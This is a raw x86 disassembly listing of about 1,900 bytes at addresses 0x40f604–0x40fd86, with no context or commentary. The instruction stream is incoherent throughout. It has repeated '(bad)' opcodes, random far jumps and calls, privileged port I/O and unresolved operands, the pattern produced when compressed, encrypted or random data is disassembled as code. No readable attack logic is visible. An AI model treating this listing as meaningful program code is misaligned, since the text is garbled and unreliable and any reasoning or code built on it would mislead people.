  40f604:	rcl    DWORD PTR [esi],1
  40f606:	dec    esi
  40f607:	pop    ecx
  40f608:	dec    eax
  40f609:	cmp    cl,ah
  40f60b:	fist   WORD PTR [ecx-0x2d262ea0]
  40f611:	retf   0x39ba
  40f614:	(bad)  
  40f615:	call   0x634:0x8630bd23
  40f61c:	fs fwait
  40f61e:	push   cs
  40f61f:	xchg   ebx,eax
  40f620:	xor    eax,0x7e890fbd
  40f625:	add    dl,BYTE PTR [eax-0x7a11e514]
  40f62b:	adc    dl,0x98
  40f62e:	test   BYTE PTR [edi+0x46c5136d],dl
  40f634:	ret    
  40f635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f636:	rol    esp,1
  40f638:	ins    BYTE PTR es:[edi],dx
  40f639:	fcom   DWORD PTR [edx+0x20343cc]
  40f63f:	dec    edx
  40f640:	cmp    al,ah
  40f642:	out    dx,al
  40f643:	sbb    BYTE PTR [eax+ecx*1],bl
  40f646:	imul   edi,DWORD PTR [esi+0x18],0xffffff98
  40f64a:	lods   al,BYTE PTR ds:[esi]
  40f64b:	sbb    dl,bl
  40f64d:	nop
  40f64e:	sub    BYTE PTR [ebp+0x5a6438b4],ch
  40f654:	mov    eax,0xd827e1f8
  40f659:	adc    eax,0x4ae9a26b
  40f65e:	add    BYTE PTR [ebx-0x3c],0x78
  40f662:	outs   dx,BYTE PTR ds:[esi]
  40f663:	pushf  
  40f664:	sbb    DWORD PTR [edi-0xc2a4736],edx
  40f66a:	mov    ds:0xb8f8d7dd,al
  40f66f:	jle    0x40f6e6
  40f671:	add    ah,al
  40f673:	in     al,0x6b
  40f675:	loopne 0x40f67d
  40f677:	inc    ebx
  40f678:	and    DWORD PTR [ebx],ebp
  40f67a:	inc    eax
  40f67b:	and    BYTE PTR [ebp-0x51],dl
  40f67e:	jmp    0x8b08:0xa7ca1c6c
  40f685:	das    
  40f686:	cdq    
  40f687:	nop
  40f688:	stc    
  40f689:	and    DWORD PTR [edx+eax*8-0x5d09f9bc],edx
  40f690:	xchg   ebx,eax
  40f691:	add    DWORD PTR [edi],ecx
  40f693:	test   eax,0xf2f9625e
  40f698:	sar    al,cl
  40f69a:	popa   
  40f69b:	fadd   DWORD PTR [edi-0x48513753]
  40f6a1:	scas   al,BYTE PTR es:[edi]
  40f6a2:	(bad)  
  40f6a3:	xchg   DWORD PTR [eax+0x7cde5973],ebx
  40f6a9:	repnz sub ecx,DWORD PTR [ecx-0x663563e2]
  40f6b0:	add    bl,BYTE PTR [edi-0x777b1208]
  40f6b6:	jbe    0x40f6c2
  40f6b8:	clc    
  40f6b9:	dec    edi
  40f6ba:	inc    esp
  40f6bb:	in     al,0xea
  40f6bd:	pop    edi
  40f6be:	cmp    eax,0x208bb6cd
  40f6c3:	es sbb cl,0xf9
  40f6c7:	icebp  
  40f6c8:	ds loopne 0x40f73f
  40f6cb:	out    dx,eax
  40f6cc:	in     al,dx
  40f6cd:	sub    esi,DWORD PTR [edi-0x33]
  40f6d0:	pop    ebx
  40f6d1:	repnz addr16 push ebp
  40f6d4:	and    ebx,esi
  40f6d6:	pusha  
  40f6d7:	jbe    0x40f706
  40f6d9:	mov    edi,0xe29ad43b
  40f6de:	push   0x41
  40f6e0:	(bad)  
  40f6e1:	xchg   ecx,eax
  40f6e2:	clc    
  40f6e3:	or     DWORD PTR [eax+esi*8-0x4854bcc7],0x75
  40f6eb:	adc    ah,BYTE PTR ds:0xa1013999
  40f6f1:	adc    ch,cl
  40f6f3:	sahf   
  40f6f4:	jmp    0x40f6c0
  40f6f6:	add    ecx,DWORD PTR ds:[edi+esi*8+0x340da2aa]
  40f6fe:	or     eax,0xc6b5f1a1
  40f703:	shr    BYTE PTR [edi],0x41
  40f706:	retf   0x489
  40f709:	(bad)  
  40f70a:	and    DWORD PTR [ecx-0x7a],esp
  40f70d:	jmp    0xe098dc20
  40f712:	fild   QWORD PTR [edi+eax*4]
  40f715:	mov    ?,ecx
  40f717:	adc    ebp,DWORD PTR [ecx+0x4d]
  40f71a:	in     eax,dx
  40f71b:	xor    esp,ecx
  40f71d:	pop    edx
  40f71e:	mov    eax,0xa15e3044
  40f723:	out    0xd9,al
  40f725:	in     eax,dx
  40f726:	adc    eax,0x6e0b4051
  40f72b:	imul   BYTE PTR [eax-0x49]
  40f72e:	mov    dh,0xbd
  40f730:	sub    al,0xc0
  40f732:	adc    BYTE PTR [edi+0x58],0x63
  40f736:	inc    ecx
  40f737:	mov    ch,0xf4
  40f739:	push   ebx
  40f73a:	arpl   dx,cx
  40f73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f73d:	int3   
  40f73e:	daa    
  40f73f:	xchg   esi,eax
  40f740:	inc    ebp
  40f741:	xor    esi,DWORD PTR [eax+0x41]
  40f744:	pop    eax
  40f745:	(bad)  
  40f746:	fnsetpm(287 only) 
  40f748:	jmp    0xb4e9:0x780df04b
  40f74f:	pusha  
  40f750:	adc    cl,bh
  40f752:	adc    eax,ebp
  40f754:	push   ds
  40f755:	push   ss
  40f756:	cmp    DWORD PTR [ebx],ebp
  40f758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f759:	icebp  
  40f75a:	stos   DWORD PTR es:[edi],eax
  40f75b:	test   al,0xc7
  40f75d:	pushf  
  40f75e:	mov    eax,ds:0x7e060d24
  40f763:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40f765:	add    ebx,DWORD PTR [ecx-0x6540e6d7]
  40f76b:	bnd jae 0x40f777
  40f76e:	stos   BYTE PTR es:[edi],al
  40f76f:	popf   
  40f770:	mov    edx,0xfa536921
  40f775:	cli    
  40f776:	jecxz  0x40f716
  40f778:	stc    
  40f779:	sbb    DWORD PTR [ebx+0x38],ebx
  40f77c:	sbb    edi,ebp
  40f77e:	call   0x95c5:0x36d93fde
  40f785:	or     DWORD PTR [esi-0x51f6524d],esp
  40f78b:	cdq    
  40f78c:	xchg   BYTE PTR [esi+0x47],ch
  40f78f:	icebp  
  40f790:	push   ecx
  40f791:	rep outs dx,BYTE PTR ds:[esi]
  40f793:	loop   0x40f767
  40f795:	(bad)  
  40f796:	popf   
  40f797:	lock ja 0x40f7ab
  40f79a:	sub    al,0x84
  40f79c:	fs pop ss
  40f79e:	int    0xfd
  40f7a0:	sahf   
  40f7a1:	dec    ecx
  40f7a2:	ja     0x40f7c0
  40f7a4:	inc    edi
  40f7a5:	xchg   ecx,eax
  40f7a6:	icebp  
  40f7a7:	add    DWORD PTR [esi+0x4c0129cc],esp
  40f7ad:	mov    eax,0x4bf4806
  40f7b2:	push   ebx
  40f7b3:	imul   ebx,DWORD PTR [ebp+0x177088d9],0xed6aca62
  40f7bd:	sahf   
  40f7be:	xor    ebx,DWORD PTR [ebx-0x4d]
  40f7c1:	daa    
  40f7c2:	cmp    cl,BYTE PTR [ecx+0x30a47076]
  40f7c8:	sub    eax,0x9c6c46d7
  40f7cd:	inc    esp
  40f7ce:	(bad)  
  40f7d0:	lea    esp,[edi+0x39]
  40f7d3:	cli    
  40f7d4:	and    esp,DWORD PTR [esi]
  40f7d6:	mov    edx,0x959ac52a
  40f7db:	dec    edi
  40f7dc:	ins    DWORD PTR es:[edi],dx
  40f7dd:	ja     0x40f7bc
  40f7df:	inc    esi
  40f7e0:	adc    bl,BYTE PTR [ebx+0x6e]
  40f7e3:	jmp    0x40f842
  40f7e5:	or     bl,BYTE PTR [edx]
  40f7e7:	test   eax,0x998ffaf3
  40f7ec:	arpl   WORD PTR [edi-0x5f],ax
  40f7ef:	pop    ebx
  40f7f0:	pusha  
  40f7f1:	test   cl,dh
  40f7f3:	mov    ah,0x2e
  40f7f5:	ins    BYTE PTR es:[edi],dx
  40f7f6:	jns    0x40f7c7
  40f7f8:	sbb    eax,0x576c56c1
  40f7fd:	mov    ds:0xe05bceea,eax
  40f802:	rcr    DWORD PTR [ecx+ecx*1-0x1e4fb1cb],0xf8
  40f80a:	mov    dh,0x9b
  40f80c:	(bad)  
  40f80d:	call   0xe092b4de
  40f812:	jns    0x40f84e
  40f814:	mov    esi,0x917c6303
  40f819:	jp     0x40f7ea
  40f81b:	adc    eax,DWORD PTR [esi]
  40f81d:	psrlw  mm1,QWORD PTR [edx+0x1f]
  40f821:	xor    dh,BYTE PTR [edi+0x27]
  40f824:	push   es
  40f825:	lds    ebp,FWORD PTR [ebp+0x4cddfc9d]
  40f82b:	fisttp DWORD PTR [ebx-0x38c214c]
  40f831:	mov    ds:0x3b72286c,al
  40f836:	jecxz  0x40f84f
  40f838:	jg     0x40f7d9
  40f83a:	push   cs
  40f83b:	cwde   
  40f83c:	ret    
  40f83d:	cmp    DWORD PTR [edi],edx
  40f83f:	jecxz  0x40f834
  40f841:	xor    al,0x8b
  40f843:	push   ss
  40f844:	jb     0x40f8b5
  40f846:	ficom  WORD PTR ds:0x86900887
  40f84c:	mov    WORD PTR [ebx+0x5e036d1f],es
  40f852:	lds    esp,FWORD PTR [edx-0x32]
  40f855:	or     bh,BYTE PTR [edx-0x73]
  40f858:	adc    bl,BYTE PTR [ebp+0xf3106d6]
  40f85e:	(bad)  
  40f85f:	pushf  
  40f860:	nop
  40f861:	adc    eax,eax
  40f863:	ins    DWORD PTR es:[edi],dx
  40f864:	push   esp
  40f865:	xor    edx,DWORD PTR [eax+eax*2-0x1abd4e06]
  40f86c:	je     0x40f85e
  40f86e:	xchg   DWORD PTR [ebp+0x76],esi
  40f871:	pop    edx
  40f872:	ret    0xb476
  40f875:	mov    esi,0x18868553
  40f87a:	mov    esi,0x318b634c
  40f87f:	or     eax,0x6e50312d
  40f884:	leave  
  40f885:	fadd   QWORD PTR ds:0xa5c798db
  40f88b:	mov    cl,0xb7
  40f88d:	popf   
  40f88e:	sahf   
  40f88f:	cdq    
  40f890:	dec    ebp
  40f891:	push   ebx
  40f892:	pushf  
  40f893:	sub    eax,DWORD PTR ds:0x4066a9dd
  40f899:	xor    eax,0x39ec3953
  40f89e:	jmp    DWORD PTR [ecx+ebx*1]
  40f8a1:	ror    BYTE PTR [edi+ebx*2-0x44],0x32
  40f8a6:	mov    dl,0x40
  40f8a8:	or     DWORD PTR [esi+ebx*1+0x7d9edd8f],edx
  40f8af:	addr16 jb 0x40f8af
  40f8b2:	scas   eax,DWORD PTR es:[edi]
  40f8b3:	retf   
  40f8b4:	aad    0xbf
  40f8b6:	enter  0xc5bf,0xf6
  40f8ba:	inc    eax
  40f8bb:	scas   eax,DWORD PTR es:[edi]
  40f8bc:	adc    ah,BYTE PTR [edx-0x6d5369f8]
  40f8c2:	jl     0x40f904
  40f8c4:	ret    0x21c7
  40f8c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8c8:	stos   DWORD PTR es:[edi],eax
  40f8c9:	push   edx
  40f8ca:	mov    gs:0x1c952222,al
  40f8d0:	ror    BYTE PTR [esi-0x25],0xd3
  40f8d4:	std    
  40f8d5:	fsub   st(4),st
  40f8d7:	push   0x2de7e6ea
  40f8dc:	imul   esp,ecx,0xffffffe8
  40f8df:	scas   eax,DWORD PTR es:[edi]
  40f8e0:	lea    esi,[eax+0x28]
  40f8e3:	push   eax
  40f8e4:	mov    bl,0x16
  40f8e6:	test   DWORD PTR [ebp-0xa6536d4],0x767e86a8
  40f8f0:	xchg   esp,eax
  40f8f1:	outs   dx,DWORD PTR ds:[esi]
  40f8f2:	jmp    0x1ac1:0x50e48bf1
  40f8f9:	jbe    0x40f8df
  40f8fb:	xor    edx,DWORD PTR [ebx]
  40f8fd:	adc    eax,0xf480ccdb
  40f902:	push   cs
  40f903:	iret   
  40f904:	xchg   edx,eax
  40f905:	dec    ebp
  40f906:	test   DWORD PTR ds:[edx],0xc789955c
  40f90d:	fnstcw WORD PTR [edx+0x62874f7d]
  40f913:	enter  0x13b8,0x7e
  40f917:	jp     0x40f94a
  40f919:	sbb    ebp,DWORD PTR [eax-0x65]
  40f91c:	xchg   ebx,eax
  40f91d:	adc    BYTE PTR gs:[eax-0x36],al
  40f921:	rcl    DWORD PTR [esi+0x16076613],1
  40f927:	imul   ecx,ecx,0x4ee277fc
  40f92d:	push   esi
  40f92e:	test   DWORD PTR [ecx+esi*8+0x1d],ebx
  40f932:	cmc    
  40f933:	fdivrp st(4),st
  40f935:	xor    edx,DWORD PTR [edi+0x369f287f]
  40f93b:	mov    ?,edx
  40f93d:	fstp   st(1)
  40f93f:	jmp    0xc18ed23b
  40f944:	(bad)  
  40f946:	cmp    edi,eax
  40f948:	sub    cl,BYTE PTR [ecx-0x15d7345b]
  40f94e:	out    dx,eax
  40f94f:	rcr    DWORD PTR [ecx-0x26],cl
  40f952:	cmp    eax,0xcaabce05
  40f957:	mov    dl,0x6f
  40f959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f95a:	add    al,0x8a
  40f95c:	les    ecx,FWORD PTR [eax+eiz*1-0x10aed50f]
  40f963:	fstp   st(2)
  40f965:	adc    DWORD PTR [esi-0x506cb558],0x4e792108
  40f96f:	outs   dx,DWORD PTR ds:[esi]
  40f970:	sbb    esi,DWORD PTR ss:[edi]
  40f973:	cwde   
  40f974:	fcmovb st,st(6)
  40f976:	ret    0x7ee5
  40f979:	xchg   BYTE PTR [edi+0x3e],bl
  40f97c:	pop    es
  40f97d:	mov    esp,0xe34f7367
  40f982:	or     esp,DWORD PTR [edi]
  40f984:	ret    
  40f985:	jb     0x40f9d3
  40f987:	int    0xae
  40f989:	int    0x8a
  40f98b:	std    
  40f98c:	into   
  40f98d:	inc    esp
  40f98e:	add    ebp,DWORD PTR [esp+ebx*2+0x4c]
  40f992:	mov    ah,0xfc
  40f994:	and    al,al
  40f996:	adc    BYTE PTR [edi+0x40],0x24
  40f99a:	pusha  
  40f99b:	mov    al,dl
  40f99d:	or     ebx,ecx
  40f99f:	mov    al,BYTE PTR [esi]
  40f9a1:	enter  0x8162,0x53
  40f9a5:	rcr    DWORD PTR [ebp-0x49],cl
  40f9a8:	cmp    BYTE PTR [esi+0x38],ch
  40f9ab:	and    ch,BYTE PTR [ecx+0x4]
  40f9ae:	scas   al,BYTE PTR es:[edi]
  40f9af:	add    bl,BYTE PTR [edx+0x38]
  40f9b2:	add    dl,dl
  40f9b4:	ja     0x40fa02
  40f9b6:	and    al,0xcb
  40f9b8:	out    dx,al
  40f9b9:	call   0xcc4ac998
  40f9be:	cmp    BYTE PTR [edi-0x9],0x6a
  40f9c2:	fisub  DWORD PTR [esi]
  40f9c4:	(bad)
  40f9c7:	cs mov edi,0xd3d981e3
  40f9cd:	sub    BYTE PTR [edx],cl
  40f9cf:	mov    ?,edx
  40f9d1:	jae    0x40f958
  40f9d3:	add    BYTE PTR [ebx],al
  40f9d5:	dec    edi
  40f9d6:	dec    esp
  40f9d7:	mov    al,ds:0x862539c0
  40f9dc:	dec    ebx
  40f9dd:	les    ebx,FWORD PTR [ebp-0x3c]
  40f9e0:	out    dx,eax
  40f9e1:	lahf   
  40f9e2:	pop    ds
  40f9e3:	push   0x2263eee2
  40f9e8:	push   cs
  40f9e9:	iret   
  40f9ea:	sub    ebp,DWORD PTR [ecx+0x2f9766af]
  40f9f0:	mov    ah,0x79
  40f9f2:	popf   
  40f9f3:	fistp  WORD PTR [eax-0x3c31c0b1]
  40f9f9:	mov    bh,0xc
  40f9fb:	retf   0xe459
  40f9fe:	lahf   
  40f9ff:	xchg   esp,eax
  40fa00:	add    ebp,DWORD PTR [edi]
  40fa02:	cli    
  40fa03:	sub    eax,0xf68d46c1
  40fa08:	call   0x34c9bd6c
  40fa0d:	or     di,sp
  40fa10:	(bad)  
  40fa12:	in     al,0x4e
  40fa14:	xor    eax,0xd29ccd1
  40fa19:	stc    
  40fa1a:	jmp    DWORD PTR [ecx]
  40fa1c:	add    BYTE PTR [edx-0x2857b54c],0x30
  40fa23:	cmp    BYTE PTR [edx-0x2e730397],cl
  40fa29:	stos   BYTE PTR es:[edi],al
  40fa2a:	fadd   QWORD PTR [esi-0x1dcf2d5e]
  40fa30:	test   eax,0xe437a303
  40fa35:	adc    ebx,DWORD PTR [ebp+ebx*2+0xe]
  40fa39:	sub    esi,esp
  40fa3b:	retf   
  40fa3c:	montmul (bad)
  40fa3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa3e:	add    BYTE PTR [edx],dl
  40fa40:	sbb    edx,esp
  40fa42:	mov    ah,0x31
  40fa45:	mov    BYTE PTR [edx-0x11ee2718],ch
  40fa4b:	pop    edx
  40fa4c:	sub    esi,esp
  40fa4e:	lea    edi,[eax]
  40fa50:	or     edx,DWORD PTR ds:0x8f9307ff
  40fa56:	jae    0x40fa5c
  40fa58:	sbb    ecx,DWORD PTR [ecx]
  40fa5a:	xlat   BYTE PTR ds:[ebx]
  40fa5b:	fnstsw WORD PTR [edi-0x782cf678]
  40fa61:	cld    
  40fa62:	outs   dx,BYTE PTR ds:[esi]
  40fa63:	sidtd  [ecx+eax*1]
  40fa67:	cs dec ecx
  40fa69:	outs   dx,DWORD PTR ds:[esi]
  40fa6a:	jg     0x40faa1
  40fa6c:	test   bl,al
  40fa6e:	push   esp
  40fa6f:	hlt    
  40fa70:	or     bl,BYTE PTR [ebp-0x32d20383]
  40fa76:	mov    dl,0x67
  40fa78:	dec    ebx
  40fa79:	lock daa 
  40fa7b:	push   ebx
  40fa7c:	out    dx,al
  40fa7d:	aam    0x2f
  40fa7f:	ret    
  40fa80:	imul   esi,DWORD PTR [esi],0x6927a4d9
  40fa86:	inc    eax
  40fa87:	and    BYTE PTR [esi+0x333c0bff],al
  40fa8d:	(bad)  
  40fa8e:	fld    QWORD PTR [ebp+0x43]
  40fa91:	sbb    ebx,DWORD PTR [edi+0xb26b9ec]
  40fa97:	arpl   sp,si
  40fa99:	pop    ebp
  40fa9a:	push   cs
  40fa9b:	dec    eax
  40fa9c:	loopne 0x40fb19
  40fa9e:	push   ss
  40fa9f:	loopne 0x40fae8
  40faa1:	shl    ch,1
  40faa3:	push   es
  40faa4:	xchg   ebp,eax
  40faa5:	fdiv   st(0),st
  40faa7:	ins    BYTE PTR es:[edi],dx
  40faa8:	dec    eax
  40faa9:	gs lahf 
  40faab:	in     eax,dx
  40faac:	aaa    
  40faad:	mov    WORD PTR [edi],gs
  40faaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fab0:	xchg   esi,eax
  40fab1:	cmp    al,BYTE PTR [esi]
  40fab3:	pop    es
  40fab4:	mov    ds:0x465d180c,al
  40fab9:	xchg   BYTE PTR [ebp+0x2e59722e],cl
  40fabf:	ss push edi
  40fac1:	push   ebx
  40fac2:	pop    edi
  40fac3:	sub    ah,ch
  40fac5:	popf   
  40fac6:	mov    esi,0xc37ddd16
  40facb:	xchg   DWORD PTR [ebp-0x5a6964ec],eax
  40fad1:	mov    BYTE PTR [edi+0x520b473b],ah
  40fad7:	xchg   edi,eax
  40fad8:	mov    esp,0x4b25874b
  40fadd:	scas   eax,DWORD PTR es:[edi]
  40fade:	pop    edx
  40fadf:	pop    ds
  40fae0:	mov    DWORD PTR [ebx],0x99c4d5f9
  40fae6:	push   esp
  40fae7:	mov    eax,0x9c7a4143
  40faec:	push   ss
  40faed:	or     ch,al
  40faef:	or     DWORD PTR es:[edx+0x64],edx
  40faf3:	outs   dx,DWORD PTR ds:[esi]
  40faf4:	or     eax,DWORD PTR [ebx]
  40faf6:	ja     0x40fa84
  40faf8:	mov    esp,0x268b5aec
  40fafd:	sbb    DWORD PTR [ebx+0x36e5ce21],edx
  40fb03:	inc    ebp
  40fb04:	sbb    BYTE PTR [eax+eax*1-0x3f3c15c6],0x24
  40fb0c:	dec    esp
  40fb0d:	sbb    al,bl
  40fb0f:	push   0x5c9a5f06
  40fb14:	inc    edx
  40fb15:	jb     0x40fb0f
  40fb17:	push   ds
  40fb18:	jmp    0x40fb27
  40fb1a:	jg     0x40fb58
  40fb1c:	stos   DWORD PTR es:[edi],eax
  40fb1d:	je     0x40faad
  40fb1f:	jecxz  0x40fae0
  40fb21:	cs loope 0x40fb70
  40fb24:	push   ss
  40fb25:	jmp    0xdd769874
  40fb2a:	nop
  40fb2b:	ror    edi,cl
  40fb2d:	pusha  
  40fb2e:	(bad)  
  40fb2f:	shl    DWORD PTR [edi-0x77],1
  40fb32:	mov    cl,0xd
  40fb34:	test   al,0xc5
  40fb36:	into   
  40fb37:	push   ebx
  40fb38:	inc    edx
  40fb39:	inc    edi
  40fb3a:	imul   ebp,DWORD PTR [ebx-0x611ed42d],0xfdce0f7b
  40fb44:	dec    edi
  40fb45:	std    
  40fb46:	stos   DWORD PTR es:[edi],eax
  40fb47:	shr    DWORD PTR [ebx+0x66],0x55
  40fb4b:	pushf  
  40fb4c:	xchg   DWORD PTR [ecx],ebx
  40fb4e:	mov    ds:0x79082de3,al
  40fb53:	push   edi
  40fb54:	das    
  40fb55:	test   edi,0xc8f181a6
  40fb5b:	adc    eax,0xcddd5c88
  40fb60:	(bad)  
  40fb61:	lahf   
  40fb62:	add    al,0x46
  40fb64:	adc    DWORD PTR [esi+0x374c44aa],ecx
  40fb6a:	dec    ecx
  40fb6b:	xchg   esi,eax
  40fb6c:	cmp    ch,BYTE PTR [edx-0x6430e767]
  40fb72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb73:	cli    
  40fb74:	je     0x40fba7
  40fb76:	shl    DWORD PTR [ebp-0x49039777],cl
  40fb7c:	ret    
  40fb7d:	loopne 0x40fb3c
  40fb7f:	cmp    cl,BYTE PTR [edx+0x15ddee16]
  40fb85:	in     al,dx
  40fb86:	dec    eax
  40fb87:	fldcw  WORD PTR ds:0x5d0e4b0c
  40fb8d:	xchg   DWORD PTR [ebx],edx
  40fb8f:	mov    cl,0x69
  40fb91:	mov    ebx,0xc6c49112
  40fb96:	je     0x40fbca
  40fb98:	repnz sbb DWORD PTR [ecx-0x45816941],edi
  40fb9f:	xchg   ecx,eax
  40fba0:	rol    edi,1
  40fba2:	mov    DWORD PTR [edx+edi*8],ebx
  40fba5:	rol    BYTE PTR [eax+esi*1],0x41
  40fba9:	aad    0x63
  40fbab:	inc    ebp
  40fbac:	jbe    0x40fbd8
  40fbae:	xor    al,0x4b
  40fbb0:	push   esp
  40fbb1:	mov    ebx,0x5a543bcd
  40fbb6:	out    0x80,eax
  40fbb8:	sar    BYTE PTR [edi-0x61],1
  40fbbb:	stc    
  40fbbc:	inc    edi
  40fbbd:	jno    0x40fbc5
  40fbbf:	inc    edi
  40fbc0:	xor    ebx,DWORD PTR [esi]
  40fbc2:	shl    ebp,cl
  40fbc4:	(bad)  
  40fbc6:	xor    eax,0x58eaedc5
  40fbcb:	bnd jbe 0x40fc09
  40fbce:	adc    ch,BYTE PTR [ebp-0x48]
  40fbd1:	pusha  
  40fbd2:	ror    DWORD PTR fs:[esi-0x67],0xa0
  40fbd7:	les    esi,FWORD PTR [edi-0x7f]
  40fbda:	pop    ds
  40fbdb:	js     0x40fb84
  40fbdd:	pop    edi
  40fbde:	dec    esi
  40fbdf:	(bad)  
  40fbe0:	xchg   edx,eax
  40fbe1:	cmc    
  40fbe2:	push   es
  40fbe3:	and    ecx,edi
  40fbe5:	inc    ebx
  40fbe6:	inc    ecx
  40fbe7:	fld    DWORD PTR [ecx-0x1e]
  40fbea:	aaa    
  40fbeb:	(bad)  
  40fbec:	cmp    eax,0x4d19848b
  40fbf1:	mov    esi,0xdd5bb1d1
  40fbf6:	pop    ss
  40fbf7:	xchg   edx,eax
  40fbf8:	ds loop 0x40fc4a
  40fbfb:	lds    edi,FWORD PTR [ecx]
  40fbfd:	inc    esp
  40fbfe:	cmc    
  40fbff:	fst    DWORD PTR [ecx-0x72]
  40fc02:	inc    DWORD PTR [eax+ebp*2+0x9fe0e90]
  40fc09:	fwait
  40fc0a:	idiv   edx
  40fc0c:	mov    edi,0x32759ecf
  40fc11:	inc    esi
  40fc12:	test   eax,0xc5c28132
  40fc17:	aas    
  40fc18:	mov    ecx,0x60f41f22
  40fc1d:	out    dx,eax
  40fc1e:	bound  esi,QWORD PTR [esi]
  40fc20:	sysexit 
  40fc22:	(bad)  
  40fc23:	mov    eax,0xd78db291
  40fc28:	test   eax,0x65691e84
  40fc2d:	cmp    DWORD PTR [ebx+0x46],esp
  40fc30:	cli    
  40fc31:	call   0x29f8:0x24dcbdb3
  40fc38:	data16 add BYTE PTR [esi-0x5],bl
  40fc3c:	pop    eax
  40fc3d:	sub    DWORD PTR [edi],ebx
  40fc3f:	scas   al,BYTE PTR es:[edi]
  40fc40:	scas   al,BYTE PTR es:[edi]
  40fc41:	cli    
  40fc42:	xor    al,0x1
  40fc44:	shl    bh,cl
  40fc46:	enter  0xb4b6,0xff
  40fc4a:	ins    DWORD PTR es:[edi],dx
  40fc4b:	loope  0x40fc6e
  40fc4d:	js     0x40fc9d
  40fc4f:	or     al,0x45
  40fc51:	es loopne 0x40fc21
  40fc54:	sbb    BYTE PTR [esi+0x28c42706],dh
  40fc5a:	mov    cs,WORD PTR [esp+edi*8]
  40fc5d:	dec    ecx
  40fc5e:	addr16 cld 
  40fc60:	loop   0x40fc81
  40fc62:	addr16 icebp 
  40fc64:	ss cmp al,0xe3
  40fc67:	outs   dx,BYTE PTR ds:[esi]
  40fc68:	pusha  
  40fc69:	out    dx,al
  40fc6a:	xchg   BYTE PTR [edi],cl
  40fc6c:	lods   al,BYTE PTR ds:[esi]
  40fc6d:	imul   BYTE PTR [ebx-0x8]
  40fc70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc71:	frstor [edx+0x1484408c]
  40fc77:	in     eax,0xff
  40fc79:	cli    
  40fc7a:	sub    BYTE PTR [edx+eax*2-0x1b464b6c],al
  40fc81:	popf   
  40fc82:	xor    ecx,DWORD PTR ds:0xf99968f3
  40fc88:	pop    eax
  40fc89:	scas   eax,DWORD PTR es:[edi]
  40fc8a:	add    eax,0x6cca9071
  40fc8f:	ins    BYTE PTR es:[edi],dx
  40fc90:	sbb    al,0xf1
  40fc92:	mov    ds:0x44996d7d,eax
  40fc97:	xor    esp,esp
  40fc99:	sbb    eax,0xff75a0a6
  40fc9e:	and    ebp,esp
  40fca0:	sbb    edx,DWORD PTR [edx+0x27880ada]
  40fca6:	(bad)  
  40fca7:	cli    
  40fca8:	in     eax,dx
  40fca9:	std    
  40fcaa:	jno    0x40fcb0
  40fcac:	or     DWORD PTR [eax],0xfc353839
  40fcb2:	loopne 0x40fcbd
  40fcb4:	retf   0xd362
  40fcb7:	es adc eax,0xe985db78
  40fcbd:	stos   DWORD PTR es:[edi],eax
  40fcbe:	xor    edi,ebx
  40fcc0:	dec    eax
  40fcc1:	mov    ah,0xcd
  40fcc3:	lea    esi,[ebx+0x5e]
  40fcc6:	xchg   edi,eax
  40fcc7:	scas   al,BYTE PTR es:[edi]
  40fcc8:	cmp    bh,BYTE PTR [ecx+0xd]
  40fccb:	add    BYTE PTR [ecx+0x22f23cde],dl
  40fcd1:	mov    eax,ds:0x6efc2c28
  40fcd6:	mov    esp,0xd5d20d8
  40fcdb:	ror    DWORD PTR [ebx+0x7ba85f61],cl
  40fce1:	call   0x1f5c892b
  40fce6:	and    BYTE PTR [ebx-0xd],al
  40fce9:	mov    al,0x1
  40fceb:	cs dec edx
  40fced:	push   0x62
  40fcef:	sbb    al,0x76
  40fcf1:	leave  
  40fcf2:	cwde   
  40fcf3:	sar    bl,cl
  40fcf5:	mov    ebp,0x343b94e7
  40fcfa:	(bad)  
  40fcfb:	jle    0x40fc8d
  40fcfd:	stc    
  40fcfe:	or     eax,0x95005bd2
  40fd03:	sbb    DWORD PTR [esp+ebx*8],eax
  40fd06:	cmc    
  40fd07:	shr    DWORD PTR [ecx+0x6e88e651],1
  40fd0d:	pop    ds
  40fd0e:	inc    edi
  40fd0f:	inc    edx
  40fd10:	(bad)  
  40fd11:	xor    BYTE PTR [eax+0x54],dl
  40fd14:	retf   0xe522
  40fd17:	arpl   WORD PTR [edx+0x70679d49],dx
  40fd1d:	mov    DWORD PTR [ecx],ebx
  40fd1f:	fwait
  40fd20:	mov    WORD PTR [ebp+esi*8-0x33a3d6d5],ss
  40fd27:	mov    edi,DWORD PTR [edx+edx*4]
  40fd2a:	shl    DWORD PTR [ecx+0x5d],0x94
  40fd2e:	mov    cl,0x99
  40fd30:	imul   esi,DWORD PTR [ebp-0x5d],0x6558f2ea
  40fd37:	add    esi,DWORD PTR [ebx+0x3]
  40fd3a:	clc    
  40fd3b:	shl    ch,1
  40fd3d:	pop    edx
  40fd3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd3f:	add    edi,DWORD PTR [ecx]
  40fd41:	inc    edi
  40fd42:	xor    edi,edx
  40fd44:	jecxz  0x40fd6b
  40fd46:	aaa    
  40fd47:	iret   
  40fd48:	scas   al,BYTE PTR es:[edi]
  40fd49:	xchg   edx,eax
  40fd4a:	fcomp  DWORD PTR [ecx+0x3874d9b7]
  40fd50:	adc    DWORD PTR [eax],0x37
  40fd53:	sub    dl,ah
  40fd55:	mov    bh,0x22
  40fd57:	xor    esi,edx
  40fd59:	shl    BYTE PTR [edx-0xe17dcbd],cl
  40fd5f:	(bad)  
  40fd60:	repnz push 0xc10b03e
  40fd66:	aam    0xe9
  40fd68:	(bad)  
  40fd69:	xchg   ebx,eax
  40fd6a:	or     eax,0xeec1262b
  40fd6f:	mov    edi,0x1e67bf6c
  40fd74:	mov    al,ds:0x7edfd598
  40fd79:	ret    0x2c65
  40fd7c:	daa    
  40fd7d:	loope  0x40fd8f
  40fd7f:	das    
  40fd80:	fidiv  DWORD PTR [edi+0xd]
  40fd83:	fwait
  40fd84:	cld    
  40fd85:	retf   
  40fd86:	sar    BYTE PTR [edx-0x4ca124b2],0x47
